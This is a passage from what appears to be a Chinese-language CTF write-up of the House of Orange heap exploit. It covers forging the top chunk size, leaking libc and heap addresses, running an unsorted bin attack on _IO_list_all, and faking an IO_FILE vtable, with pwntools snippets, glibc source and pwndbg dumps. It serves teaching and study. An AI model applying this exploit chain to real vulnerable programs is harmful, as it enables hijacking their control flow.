class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;name :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Name :&#x27;</span>, data)<br>	sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br>	sla(<span class="hljs-string">&#x27;Orange:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">size, data</span>):<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;name :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>	sa(<span class="hljs-string">&#x27;Name:&#x27;</span>, data)<br>	sla(<span class="hljs-string">&#x27;Price of Orange:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>))<br>	sla(<span class="hljs-string">&#x27;Orange:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>);<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;Your choice : &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br></code></pre></td></tr></table></figure>



<h3 id="修改top-chunk-size实现free的效果"><a href="#修改top-chunk-size实现free的效果" class="headerlink" title="修改top chunk size实现free的效果"></a>修改top chunk size实现free的效果</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin),这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins</p>
<p>来看一下这个过程的详细情况，假设目前的top chunk已经不满足malloc的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到libc.so的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验fastbin、small bins、unsorted bin、large bins是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用top chunk，在这里top chunk也不能满足分配的要求，因此会执行如下分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="hljs-number">0</span>))<br>    alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此时ptmalloc已经不能满足用户申请堆内存的操作，需要执行sysmalloc来向系统申请更多的空间。 但是对于堆来说有mmap和brk两种分配方式，需要让堆以brk的形式拓展，之后原有的top chunk会被置于unsorted bin中。</p>
<p>综上，要实现brk拓展top chunk，但是要实现这个目的需要绕过一些libc中的check，首先，malloc的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))<br></code></pre></td></tr></table></figure>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
<p>在sysmalloc函数中存在对top chunk size的check，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>     ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>      prev_inuse(old_top) &amp;&amp;<br>      ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)old_end &amp; pagemask) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>

<p>这里检查了top chunk的合法性，如果第一次调用本函数，top chunk可能没有初始化，所以可能old_size为0，如果top chunk已经初始化了，那么top chunk的大小必须大于等于MINSIZE，因为top chunk中包含了  fencepost，所以top chunk的大小必须要大于MINSIZE。其次Top  chunk必须标识前一个chunk处于inuse状态，并且top chunk的结束地址必定是页对齐的。此外top  chunk除去fencepost的大小必定要小于所需chunk的大小，否则在_int_malloc()函数中会使用top  chunk分割出chunk</p>
<p>总结一下伪造的top chunk size的要求</p>
<p>1.伪造的size必须要对齐到内存页</p>
<p>2.size要大于MINSIZE(0x10)</p>
<p>3.size要小于之后申请的chunk size + MINSIZE(0x10)</p>
<p>4.size的prev inuse位必须为1</p>
<p>之后原有的top chunk就会执行<code>_int_free</code>从而顺利进入unsorted bin中</p>
<p>回到题中,就要得满足以上要求</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; x /40gx 0x555555758060<br>0x555555758060:	0x0000000000000000	0x0000000000020fa1<br>0x555555758070:	0x0000000000000000	0x0000000000000000<br>0x555555758080:	0x0000000000000000	0x0000000000000000<br>0x555555758090:	0x0000000000000000	0x0000000000000000<br>0x5555557580a0:	0x0000000000000000	0x0000000000000000<br>0x5555557580b0:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>然而 0x555555758060 + 0x0000000000020fa1 &#x3D;&#x3D;  0x555555779001 , 去掉inuse位,则内存是按照0x1000对齐的,则我们所能修改top chunk的大小就可以为: (x * 0x1000 + 0x20fa1) &gt; MINSIZE(0x10) (x 属于 整数),题中在添加的时候,最多只能申请大小为0x1000,那我们就通过堆溢出把top chunk size 改为: 0x0fa1, 然后再申请大于这个top chunk size的chunk就可以实现top chunk free后成为unsoted bin </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ad(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span>)<br>p = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span><br>p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) <span class="hljs-comment">#后一个储存颜色的chunk</span><br>p += p64(<span class="hljs-number">0x1f00000010</span>)<br>p += p64(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># top chunk pre_size</span><br>p += p64(<span class="hljs-number">0x00fa1</span>) <span class="hljs-comment"># top chunk size</span><br>   md(<span class="hljs-number">0x80</span>, p) <span class="hljs-comment"># 堆溢出修改top chunk size</span><br></code></pre></td></tr></table></figure>

<p>实现如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; bin<br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br>all: <span class="hljs-number">0x5555557580a0</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x5555557580a0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>



<h3 id="Leak-libc-and-heap-addr"><a href="#Leak-libc-and-heap-addr" class="headerlink" title="Leak libc and heap addr"></a>Leak libc and heap addr</h3><p>申请一个小于刚才释放 unsoted bin 大小的一个chunk,根据unsoted bin的分割特性,会把main_arena转移,且不会清空chunk 的fd和bk的内容,所以main_arena还存在,直接打印即可获取main_arena地址泄漏libc,但在添加的时候要输入内容,为了得到完整的main_arena地址信息,就填充8个字符到chunk bk位置从而泄漏完整地址, 为了后面要采取伪造fake IO_FILE结构,就要得修改vtable指向当前伪造的虚函数表,那就要得知道heap地址了, 那怎么泄漏 heap地址呢? 由于large bin 大小的chunk有一个特点,申请成功的chunk 的 fd_nextsize和bk_nextsize会填充为自己的地址</p>
<p>large bin申请成功后,会向fd_nextsize和bk_nextsize填充自己的地址代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-comment">//这里若申请的是符合large bin大小的chunk</span><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      <span class="hljs-comment">//向后退两个chunk, 而fwd-&gt;fd == victim</span><br>                      fwd = bck; <br>                      bck = bck-&gt;bk; <span class="hljs-comment">// bck-&gt;fd =fwd-&gt;bk</span><br>					  <span class="hljs-comment">//这里的victim 的值就是chunk的申请到的地址</span><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="hljs-comment">//还是填充自己本身地址</span><br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  <span class="hljs-comment">//填充之后,再取出来继续填充一样的地址,还是本身地址.</span><br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br></code></pre></td></tr></table></figure>



<p>成功malloc(0x400)后填充’C’ * 8 的堆数据如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; x /40gx 0x5555557580c0<br>0x5555557580c0:	0x0000000000000000	0x0000000000000411<br>0x5555557580d0:	0x4343434343434343	0x00007ffff7dd2188 <span class="hljs-comment"># main_arena + 88</span><br>0x5555557580e0:	0x00005555557580c0	0x00005555557580c0 <span class="hljs-comment"># self heap addr</span><br></code></pre></td></tr></table></figure>



<p>利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak libc base with overflow</span><br>ad(<span class="hljs-number">0x400</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x8</span>)<br>dp()<br>lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - main_arena - <span class="hljs-number">1640</span><br>li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br>   <br>   <span class="hljs-comment"># leak heap addr with large bin</span><br>md(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x10</span>)<br>dp()<br>ru(<span class="hljs-string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>)<br>heap = u64(ru(<span class="hljs-string">&#x27;\x0a&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xc0</span><br>li(<span class="hljs-string">&#x27;heap &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br></code></pre></td></tr></table></figure>



<h3 id="触发异常劫持控制流程"><a href="#触发异常劫持控制流程" class="headerlink" title="触发异常劫持控制流程"></a>触发异常劫持控制流程</h3><p>怎么触发呢? 只要破坏unsorted bin 链表结构,再次申请时就会触发异常,那触发异常就会打印错误信息,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数，而 malloc_printerr<code>其实是调用</code> <code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>, 然后根据<code>IO_list_all</code>中的值去遍历IO_FILE调用IO_FILE 的vtable中的 <code>__overflow</code>函数指针</p>
<h3 id="unsorted-bin-attack-修改-IO-list-all"><a href="#unsorted-bin-attack-修改-IO-list-all" class="headerlink" title="unsorted bin attack 修改 _IO_list_all"></a>unsorted bin attack 修改 <code>_IO_list_all</code></h3><p>如何进行劫持,采用修改old top chunk 的结构,使之报错,然而我们只需要采用unsorted bin attack修改<code>_IO_list_all</code>的值为unsorted_chunks(av)也就是main_arena + 0x58.修改这个有什么用? 本来<code>_IO_list_all</code>的值是指向<code>_IO_2_1_stderr</code>,若修改这个值,那么在malloc报错的时候就会遍历<code>_IO_list_all</code> 指向的IO_FILE结构体，详细后面会说道.</p>
<p>unsorted bin attack 实现攻击源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;<br>               victim == av-&gt;last_remainder &amp;&amp;<br>               (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) &#123;<br>               ....<br>           &#125;<br><br>           <span class="hljs-comment">/* remove from unsorted list */</span><br>           unsorted_chunks(av)-&gt;bk = bck;<br>           bck-&gt;fd                 = unsorted_chunks(av); <span class="hljs-comment">//实现想目标处修改值</span><br></code></pre></td></tr></table></figure>



<p>实现修改如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwndbg&gt; x /10gx &amp;_IO_list_all<br>0x7ffff7dd2520 &lt;_IO_list_all&gt;:	0x00007ffff7dd1b78	0x0000000000000000<br>0x7ffff7dd2530:	0x0000000000000000	0x0000000000000000<br>0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:	0x00000000fbad2086	0x0000000000000000<br>0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:	0x0000000000000000	0x0000000000000000<br>0x7ffff7dd2560 &lt;_IO_2_1_stderr_+32&gt;:	0x0000000000000000	0x0000000000000000<br><br>pwndbg&gt; x /10gx 0x00007ffff7dd1b78<br>0x7ffff7dd1b78 &lt;main_arena+88&gt;:	0x000055555577a010	0x00005555557584f0<br>0x7ffff7dd1b88 &lt;main_arena+104&gt;:	0x00005555557584f0	0x00007ffff7dd2510<br>0x7ffff7dd1b98 &lt;main_arena+120&gt;:	0x00007ffff7dd1b88	0x00007ffff7dd1b88<br>0x7ffff7dd1ba8 &lt;main_arena+136&gt;:	0x00007ffff7dd1b98	0x00007ffff7dd1b98<br>0x7ffff7dd1bb8 &lt;main_arena+152&gt;:	0x00007ffff7dd1ba8	0x00007ffff7dd1ba8<br></code></pre></td></tr></table></figure>



<p>利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Control program</span><br>p = <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x400</span><br>p += p64(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0x21</span>)<br>p += <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># fake file</span><br>f = p64(<span class="hljs-number">0</span>)		   <span class="hljs-comment"># old top chunk prev_size</span><br>f += p64(<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># old top chunk size</span><br>f += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>) <span class="hljs-comment"># unsoted bin attack实现修改 _IO_list_all</span><br></code></pre></td></tr></table></figure>



<h3 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h3><p>若下次申请大小为0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;&#x3D; 2*SIZE_SZ，就会触发malloc_printerr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>    &#123;<br>      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<span class="hljs-comment">// 执行该函数</span><br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br></code></pre></td></tr></table></figure>



<p>那么在执行malloc_printerr函数就会执行到<code>_IO_flush_all_lockp</code>, 来了解一下<code>_IO_flush_all_lockp</code> 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   <span class="hljs-comment">//循环遍历IO_FILE,采用 fp-&gt;chain来进行获取下一个IO_FILE, 那么</span><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_flockfile (fp);<br>      <span class="hljs-comment">//check, 在后面伪造的IO_FILE中需要绕过,然后执行 _IO_OVERFLOW (fp, EOF) == EOF)</span><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <br>           || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>               &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>           )<br>          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="hljs-comment">//参数传入IO_FILE的地址和EOF</span><br>        result = EOF;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>        _IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在<code>_IO_flush_all_lockp</code>函数中会根据<code>_IO_list_all</code>中的值,依次遍历IO_FILE,那我们就想法设法构建自己的IO_FILE,若IO_FILE满足fp-&gt;<code>_mode</code> &lt;&#x3D; 0 &amp;&amp; fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 然后会调用vtable中的<code>__overflow</code> 函数,我们就可以伪造一个vtable,实现在调用<code>__overflow</code>的时候调用我们的函数</p>
<p>来了解一下IO_FILE_plus结构体.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> （<span class="hljs-title">size_of</span>=</span><span class="hljs-number">0x78</span>+<span class="hljs-number">0x8</span>）<br>&#123;<br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;		<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;	<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;	<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;	<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;	<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;	<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;	<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;	<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;	<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span 